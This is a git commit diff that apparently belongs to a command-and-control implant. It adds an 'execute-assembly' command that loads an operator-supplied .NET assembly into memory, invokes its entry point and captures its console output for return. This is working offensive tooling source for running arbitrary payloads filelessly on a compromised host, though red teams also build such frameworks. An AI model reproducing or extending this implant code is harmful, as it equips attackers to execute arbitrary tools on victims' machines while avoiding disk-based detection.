8294b7b0b8fd6bcc63945655881fffa37e064ed0
dead-jaskier <symon3@protonmail.com>
2022-01-18 19:06:30 -0600

    Added ExecuteAssembly command

---
+++ Agent/Commands/ExecuteAssembly.cs
@@ -0,0 +1,21 @@
+﻿using Agent.Models;
+
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Agent.Commands
+{
+    public class ExecuteAssembly : AgentCommand
+    {
+        public override string Name => "execute-assembly";
+
+        public override string Execute(AgentTask task)
+        {
+            var result = Internal.Execute.ExecuteAssembly(task.FileBytes, task.Arguments);
+            return result;
+        }
+    }
+}
--- Agent/Internal/Execute.cs
+++ Agent/Internal/Execute.cs
@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Reflection;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -36,6 +37,40 @@ namespace Agent.Internal
             {
                 output += process.StandardError.ReadToEnd();
             }
+
+            return output;
+        }
+
+        public static string ExecuteAssembly(byte[] asm, string[] arguments = null)
+        {
+            if (arguments is null)
+                arguments = new string[] { };
+
+            var currentOut = Console.Out;
+            var ccurrentError = Console.Error;
+
+            var stream = new MemoryStream();
+            var writer = new StreamWriter(stream)
+            {
+                AutoFlush = true
+            };
+
+            Console.SetOut(writer);
+            Console.SetError(writer);
+
+            var assembly = Assembly.Load(asm);
+            assembly.EntryPoint.Invoke(null, new object[] { arguments });
+
+            Console.Out.Flush();
+            Console.Error.Flush();
+
+            var output = Encoding.UTF8.GetString(stream.ToArray());
+
+            Console.SetOut(currentOut);
+            Console.SetError(ccurrentError);
+
+            stream.Dispose();
+            writer.Dispose();
 
             return output;
         }
